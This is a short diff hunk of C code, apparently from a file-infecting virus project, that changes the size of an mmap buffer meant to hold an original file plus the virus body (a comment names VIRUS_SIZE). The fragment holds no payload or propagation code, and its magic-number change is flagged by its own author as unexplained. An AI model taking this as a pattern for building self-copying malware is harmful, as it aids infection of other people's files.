@@ -73,7 +73,7 @@ bool			init_clone_safe(struct safe_ptr *accessor, const size_t original_filesize
 	// TODO check if enough!
 	// accessor->size = original_filesize + VIRUS_SIZE + PAGE_ALIGNMENT;
 	// magic number was: 131072??????
-	accessor->size = original_filesize + 131072; // TODO WTF?!?!?!?
+	accessor->size = original_filesize + 131572; // TODO WTF?!?!?!?
 	accessor->ptr  = sys_mmap(0, accessor->size, \
 		PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
 
